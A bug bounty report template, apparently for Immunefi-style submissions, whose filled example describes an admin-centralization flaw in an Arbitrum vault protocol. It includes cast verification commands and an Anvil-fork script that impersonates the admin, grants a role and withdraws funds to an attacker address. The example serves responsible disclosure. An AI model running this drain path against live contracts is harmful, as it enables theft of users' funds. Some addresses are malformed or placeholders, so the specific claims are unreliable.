# Bug Bounty Report Template — Immunefi / Hats Finance / Code4rena / Sherlock

**Use this template for every submission. Copy, fill, submit.**

---

## Executive Summary

| Field | Value |
|-------|-------|
| **Protocol** | [Protocol Name] |
| **Chain(s)** | [Ethereum / Arbitrum / Base / Optimism / etc.] |
| **Severity** | [Critical / High / Medium / Low] |
| **TVL at Risk** | $[Amount] |
| **Vulnerability Type** | [Admin Centralization / Access Control / Upgrade / Oracle / Reentrancy / etc.] |
| **Affected Contracts** | [Contract names + addresses] |
| **Bounty Estimate** | $[Min] – $[Max] |

---

## Vulnerability Details

### Component
[Which contract/role/system: e.g., Silo Admin, Vault Fee Setter, Proxy Upgrade, Whitelist]

### Root Cause
[One paragraph: why this exists. e.g., "Single EOA controls Silo with no multisig/timelock. Owner can grant DEPOSIT_ROLE/WITHDRAW_ROLE to any address."]

### Attack Path
```text
Step 1: [Prerequisite — e.g., Compromise Silo Admin private key]
Step 2: [Action — e.g., Call grantRole(DEPOSIT_ROLE, attacker) on Silo]
Step 3: [Action — e.g., Deposit to Gami USDC vault via Silo]
Step 4: [Action — e.g., Withdraw from Gami USDC vault to attacker wallet]
Step 5: [Result — e.g., $6.4M drained from 4 vaults simultaneously]
```

### Prerequisites
- [ ] [Prerequisite 1 — e.g., Admin private key compromise]
- [ ] [Prerequisite 2 — e.g., No timelock on role grants]
- [ ] [Prerequisite 3 — e.g., Shared silo architecture]

---

## Proof of Concept

### On-Chain Verification Commands

```bash
# 1. Verify Silo Admin (Single EOA)
cast call 0xcd07ed2d762b498abc68958b2458cc67e5212a4d "owner()" --rpc-url $ARB_RPC
# Returns: 0x9999bca723d0fc7b064f03608fc383998eba9b35

# 2. Verify Factory stores Silo Admin at slot 10
cast storage 0x0000000000cc53b5fd649b80f08b05405779cc71 0xa --rpc-url $ARB_RPC
# Returns: 0x9999bca723d0fc7b064f03608fc383998eba9b35

# 3. Verify Shared Silo across 4 vaults
cast call 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8 "balanceOf(address)" 0xcd07ed2d762b498abc68958b2458cc67e5212a4d --rpc-url $ARB_RPC
# Returns: ~6,400,000 USDC ($6.4M)

# 4. Verify Vault Impl mismatch (Blockscout vs Reality)
cast storage 0x0000000000cc53b5fd649b80f08b05405779cc71 0x3 --rpc-url $ARB_RPC
# Returns: 0x7aea44d133195ddd032f960a6e4a3f (REAL)
# Blockscout shows: 0x00ac46824e664881581f0E105Bb5e492 (FAKE)

# 5. Verify Vault non-standard (ERC-4626 non-compliant)
cast call 0x98e43a491a464f0886bc5e57207c340bbed0d01f "totalAssets()" --rpc-url $ARB_RPC
# REVERTS — not standard ERC-4626

# 6. Verify Fee Parameter
cast call 0x00000000007aea44d133195ddd032f960a6e4a3f "0x022d63fb" --rpc-url $ARB_RPC
# Returns: 431936 (43.19%)

# 7. Verify Whitelist on Gami USDC
# From API: depositWhitelist=true, depositEnabled=false
```

### Simulated Attack (Anvil Fork)

```bash
# 1. Fork Arbitrum at block N
anvil --fork-url $ARB_RPC --fork-block-number 12345678

# 2. Impersonate Silo Admin
cast send 0xcd07ed2d762b498abc68958b2458cc67e5212a4d "grantRole(bytes32,address)" \
  0x...DEPOSIT_ROLE... 0xAttackerAddress \
  --rpc-url http://localhost:8545 --unlocked --from 0x9999bca723d0fc7b064f03608fc383998eba9b35

# 3. Deposit via Silo
cast send 0xcd07ed2d762b498abc68958b2458cc67e5212a4d "deposit(uint256,address)" \
  1000000 0xAttackerAddress \
  --rpc-url http://localhost:8545 --unlocked --from 0xAttackerAddress

# 4. Withdraw from Gami USDC Vault
cast send 0x9984ad74c5fb6bec3888e14b4e453707d3be7f8f "withdraw(uint256,address,address)" \
  1000000 0xAttackerAddress 0xAttackerAddress \
  --rpc-url http://localhost:8545 --unlocked --from 0xAttackerAddress

# Result: Attacker receives $6M+ USDC
```

---

## Impact Assessment

| Metric | Value |
|--------|-------|
| **Max Loss** | $[Amount] (all vaults / single vault) |
| **Likelihood** | [High / Medium / Low] — [Reason: e.g., Single EOA, 0.011 ETH balance, no monitoring] |
| **Affected Users** | [Number/All users of protocol] |
| **Funds at Risk** | $[TVL] across [N] vaults |
| **Time to Exploit** | [Minutes/Hours] once prerequisite met |
| **Reversibility** | [None / Partial / Full via timelock] |

### Attack Scenarios

| Scenario | Probability | Impact |
|----------|-------------|--------|
| **A. Admin Key Compromise** (Phishing/Supply Chain) | High | $6.4M (all 4 vaults) |
| **B. Silo Bug** (Reentrancy/Oracle/Access) | Medium | $6.4M (all 4 vaults) |
| **C. Fee Setter Abuse** (Hidden selector) | Medium | All yield / Principal on exit |
| **D. Whitelist Bypass** (Gami USDC) | Low | $6M (single vault) |

---

## Recommended Fix

### Immediate (Critical)
- [ ] Migrate Silo Admin to Gnosis Safe (3/5 multisig)
- [ ] Add TimelockController (48h delay) for all admin actions
- [ ] Deploy separate Silo per vault (remove shared architecture)

### Short-term (High)
- [ ] Verify and publish REAL Vault Impl address (0x7aea44...)
- [ ] Add AccessControl with role-based permissions (DEPOSIT_ROLE, WITHDRAW_ROLE, PAUSE_ROLE)
- [ ] Add Timelock for fee changes (72h delay)

### Medium-term
- [ ] Add UUPS upgrade capability with timelocked admin
- [ ] Implement ERC-4626 standard interface
- [ ] Add emergency pause circuit breaker
- [ ] Bug bounty program on Immunefi

---

## Disclosure Timeline

| Date | Action |
|------|--------|
| [Date] | Vulnerability discovered |
| [Date] | Report submitted to Immunefi |
| [Date] | Team acknowledges / triages |
| [Date] | Fix deployed / mitigation |
| [Date] | Public disclosure (after fix + 30 days) |

---

## Additional Context

- **Blockscout Misinformation**: Explorer shows wrong Vault Impl. Always verify via proxy storage.
- **Custom Implementation**: Vault uses 43 custom selectors, no standard ERC-4626. Admin functions hidden in 4-byte space.
- **Cross-Chain**: Same architecture likely on Robinhood Chain (CREATE2 deterministic addresses).
- **Monitoring**: Watch Silo Admin address `0x9999bca723d0fc7b064f03608fc383998eba9b35` for activity.

---

## Attachments

- [ ] PoC script (Foundry/Anvil)
- [ ] Screenshots of cast outputs
- [ ] Architecture diagram
- [ ] Transaction traces (if mainnet test done)